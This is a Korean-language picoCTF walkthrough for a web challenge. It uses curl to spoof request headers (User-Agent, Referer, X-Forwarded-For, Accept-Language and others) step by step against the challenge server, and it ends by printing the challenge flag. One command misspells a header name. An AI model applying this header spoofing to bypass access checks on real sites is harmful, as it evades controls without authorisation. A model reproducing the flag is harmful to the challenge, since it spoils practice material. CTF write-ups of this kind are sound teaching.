---
tags:
  - picoCTF
  - web
  - header-modification
tech:
  - Web
  - Header Modification
---


# Link
-  https://play.picoctf.org/practice/challenge/142?category=1&page=3

# Walk-Through

해당 문제는 브라우저에 표출되는 문장에 대응하는 적절한 HTTP Header를 수정해서 요청하는 방식으로 풀어낼 수 있다. 처음 접속하면 다음과 같은 문장이 보인다.
```
Only people who use the official PicoBrowser are allowed on this site!
```
PicoBrowser를 통해서만 접속할 수 있다고 하니 "User-Agent"를 "PicoBrowser"로 수정해서 접속하면 다음과 같은 문장이 나온다.
```
t trust users visiting from another site.
```
이 때 부터는 curl 명령어를 이용했다. 위 문장은 다른 사이트로부터 방문한 사용자를 허용하지 않는다고 하는 듯 하다.  HTTP Header 중 "Referer" Header는 웹 페이지 요청 시 해당 요청이 어디서 발생했는지를 나타낸다. 이 특징을 이용하자.
```bash
╰─$ curl -A "PicoBrowser" -H "Referer: http://mercury.picoctf.net:39114/" http://mercury.picoctf.net:39114/ 
```
이 요청에 대한 응답으로 다음과 같은 메세지를 볼 수 있다.
```
Sorry, this site only worked in 2018
```
이 사이트는 2018년에만 작동한다는 메세지이다. HTTP Header의 "Date"를 활용해보자. Date Header는 Http 메시지가 발생한 날짜와 시간을 포함할 수 있다.
``` bash
╰─$ curl -A "PicoBrowser" -H "Referer: mercury.picoctf.net:39114/" -H "Date: 2018" http://mercury.picoctf.net:39114/
```
이 요청에 대한 결과는 다음과 같다.
```
t trust users who can be tracked.
```
추적에 관련된 메시지인데 HTTP Header 중 DNT를 활용할 수 있을 듯 보인다. DNT는 사용자의 추적 설정을 나타내는데 사용된다.
```bash
╰─$ curl -A "PicoBrowser" -H "Referer: mercury.picoctf.net:39114/" -H "Date: 2018" -H "DNT: 1" http://mercury.picoctf.net:39114/
```
이에 대한 응답으로는 다음과 같은 메시지가 응답된다.
```
This website is only for people from Sweden.
```
X-Forwarded-For를 활용하자. 이 HTTP Header는 MDN의 문서에 따르면 "HTTP 프록시나 로드 밸런서를 통해 웹 서버로 연결하는 클라이언트의 시작 IP 주소"라고 한다.
```
╰─$ curl -A "PicoBrowser" -H "Referer: mercury.picoctf.net:39114/" -H "Date: 2018" -H "DNT: 1" -H "X-Forwared-For: 92.34.186.83" http://mercury.picoctf.net:39114/
```
이에 대한 응답은 다음과 같다.
```
re in Sweden but you don&#39;t speak Swedish?
```
Accept-Language Header를 이용해 스웨던 언어를 허용하면 될 듯 보인다.

```bash
╰─$ curl -A "PicoBrowser" -H "Referer: mercury.picoctf.net:39114/" -H "Date: 2018" -H "DNT: 1" -H "X-Forwarded-For: 92.34.186.83" -H "Accept-Language: sv-SWE" http://mercury.picoctf.net:39114/ -vv
```
이후 flag를 확인할 수 있다.


flag
- picoCTF{http_h34d3rs_v3ry_c0Ol_much_w0w_20ace0e4}